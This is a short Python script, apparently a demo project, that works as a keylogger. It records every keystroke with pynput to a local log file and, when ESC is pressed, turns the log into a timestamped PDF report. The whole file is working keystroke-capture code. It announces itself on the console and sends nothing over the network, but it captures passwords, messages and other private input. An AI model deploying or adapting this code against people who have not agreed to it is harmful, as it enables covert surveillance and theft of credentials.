from pynput.keyboard import Key, Listener
import logging
import os
from datetime import datetime

# PDF Library
from reportlab.platypus import SimpleDocTemplate, Paragraph
from reportlab.lib.styles import getSampleStyleSheet

# =========================
# Folders Setup
# =========================
log_dir = "../logs/"
report_dir = "../reports/"

os.makedirs(log_dir, exist_ok=True)
os.makedirs(report_dir, exist_ok=True)

log_file = os.path.join(log_dir, "keylogs.txt")

# =========================
# Logging Config
# =========================
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)

# =========================
# Format Keys
# =========================
def format_key(key):
    try:
        return key.char
    except AttributeError:
        if key == Key.space:
            return " "
        elif key == Key.enter:
            return "\n"
        elif key == Key.tab:
            return "\t"
        else:
            return f"[{key.name}]"

# =========================
# On Press
# =========================
def on_press(key):
    logging.info(format_key(key))

# =========================
# Generate PDF Report
# =========================
def generate_pdf():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    pdf_file = os.path.join(report_dir, f"report_{timestamp}.pdf")

    styles = getSampleStyleSheet()
    doc = SimpleDocTemplate(pdf_file)

    story = []

    try:
        with open(log_file, "r") as file:
            for line in file:
                story.append(Paragraph(line, styles["Normal"]))
    except Exception as e:
        print("Error reading log file:", e)
        return

    doc.build(story)
    print(f"[INFO] PDF report generated: {pdf_file}")

# =========================
# Stop Logger (ESC)
# =========================
def on_release(key):
    if key == Key.esc:
        print("\n[INFO] Stopping keylogger...")
        generate_pdf()
        return False

# =========================
# Start Listener
# =========================
def start_logger():
    print("[INFO] Keylogger started... Press ESC to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# =========================
# Run
# =========================
if __name__ == "__main__":
    start_logger()
